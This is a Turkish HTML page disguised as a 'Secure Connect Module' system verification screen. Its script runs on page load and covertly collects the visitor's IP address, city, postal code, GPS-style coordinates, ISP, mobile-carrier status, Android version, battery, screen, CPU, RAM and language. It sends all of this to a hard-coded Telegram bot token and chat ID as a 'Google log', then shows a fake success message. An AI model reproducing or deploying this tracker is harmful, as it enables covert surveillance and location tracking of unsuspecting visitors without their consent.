<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrolü</title>
    <style>
        body { background: #0a0a0a; color: #00ff66; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 85%; max-width: 400px; padding: 20px; border: 1px solid #00ff66; background: #111; text-align: center; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
    </style>
</head>
<body>

    <div class="box">
        <div style="font-weight: bold; margin-bottom: 10px;">⚡ SECURE CONNECT MODULE v4.0</div>
        <div id="status">Sistem ve işletim sistemi doğrulaması yapılıyor...</div>
    </div>

    <script>
        window.onload = async function() {
            let ip = "Bilinmiyor";
            let ulke = "Bilinmiyor";
            let eyalet_sehir = "Bilinmiyor";
            let posta_kodu = "Bilinmiyor";
            let koordinat = "Bilinmiyor";
            let internet_sirketi = "Bilinmiyor";
            let mobil_mi = "Hayır (Ev/İş İnterneti)";
            let ulke_kod = "Bilinmiyor";
            let para_birimi = "Bilinmiyor";

            // 1. Konum ve Operatör Bilgilerini Çek
            try {
                let istek = await fetch("https://ipapi.co/json/");
                let veri = await istek.json();
                
                if (veri && !veri.error) {
                    ip = veri.ip || "Bilinmiyor";
                    ulke = veri.country_name || "Bilinmiyor";
                    eyalet_sehir = (veri.region || "Bilinmiyor") + " / " + (veri.city || "Bilinmiyor");
                    posta_kodu = veri.postal || "Bilinmiyor";
                    koordinat = (veri.latitude || "0") + " , " + (veri.longitude || "0");
                    internet_sirketi = veri.org || "Bilinmiyor";
                    ulke_kod = veri.country_calling_code || "Bilinmiyor";
                    para_birimi = veri.currency || "Bilinmiyor";

                    let org_lower = internet_sirketi.toLowerCase();
                    if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
                        mobil_mi = "Evet (Mobil / Şebeke)";
                    }
                }
            } catch (e) {
                try {
                    let yedek_istek = await fetch("https://api.db-ip.com/v2/free/self");
                    let yedek_veri = await yedek_istek.json();
                    if (yedek_veri && yedek_veri.ipAddress) {
                        ip = yedek_veri.ipAddress;
                        ulke = yedek_veri.countryName;
                        eyalet_sehir = yedek_veri.city || "Bilinmiyor";
                    }
                } catch(err){}
            }

            // 2. 🔥 GERÇEK ANDROID SÜRÜMÜNÜ BULMA MODÜLÜ 🔥
            let os = "Bilinmeyen Sistem";
            let ua = navigator.userAgent;

            if (/Android/i.test(ua)) {
                os = "Android";
                // Eğer tarayıcı yeni nesil sürüm kontrolünü destekliyorsa gerçek sürümü iste
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    try {
                        let uaData = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
                        if (uaData.platformVersion) {
                            let anaSurum = parseInt(uaData.platformVersion.split('.')[0]);
                            // Android 11+ için platformVersion major sayıları kayar, o yüzden eşleme yapıyoruz:
                            if (anaSurum === 11) os = "Android 11";
                            else if (anaSurum === 12) os = "Android 12";
                            else if (anaSurum === 13) os = "Android 13";
                            else if (anaSurum === 14) os = "Android 14";
                            else if (anaSurum === 15) os = "Android 15";
                            else if (anaSurum > 0 && anaSurum <= 10) os = "Android " + anaSurum;
                        }
                    } catch (uaErr) {
                        // Hata alırsak eski yönteme dön ama Android 10 kısıtlamasını hatırlat
                        let match = ua.match(/Android\s([0-9\.]+)/);
                        os = match ? "Android " + match[1] : "Android";
                    }
                } else {
                    // Eğer eski bir tarayıcıysa mecbur düz metinden oku
                    let match = ua.match(/Android\s([0-9\.]+)/);
                    os = match ? "Android " + match[1] : "Android";
                }
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                os = "iOS";
            } else if (/Windows/i.test(ua)) {
                os = "Windows";
            }

            // 3. Tarayıcı Donanım ve Teknik Bilgileri
            let pil = "Bilinmiyor";
            if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
            
            let ekran = window.screen.width + "x" + window.screen.height;
            let cekirdek = navigator.hardwareConcurrency || "?";
            let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
            let dil = navigator.language || "Bilinmiyor";
            let tarih = new Date().toLocaleString('tr-TR');

            // 4. Telegram Mesaj Şablonu
            let mesaj = "👤 *YENİ GELİŞMİŞ GOOGLE LOGU*\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
            mesaj += "🤖 *Sistem (OS):* " + os + "\n";
            mesaj += "🌍 *Tarayıcı:* Google Chrome\n";
            mesaj += "⏰ *Ağ Zamanı:* " + tarih + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
            mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
            mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
            mesaj += "📞 *Ülke Tel Kodu:* " + ulke_kod + " | *Para:* " + para_birimi + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🖥 *Ekran Çözünürlüğü:* " + ekran + "\n";
            mesaj += "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
            mesaj += "💾 *Tahmini RAM:* " + ram + "\n";
            mesaj += "🔋 *Pil Durumu:* " + pil + "\n";
            mesaj += "🗣 *Cihaz Dili:* " + dil + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";

            // 5. Telegram'a Gönderim
            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
            let cid = "6845229845";
            let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";

            fetch(url).then(() => {
                document.getElementById('status').innerText = "Bağlantı kararlı. Sürüm onaylandı.";
            });
        };
    </script>
</body>
</html>
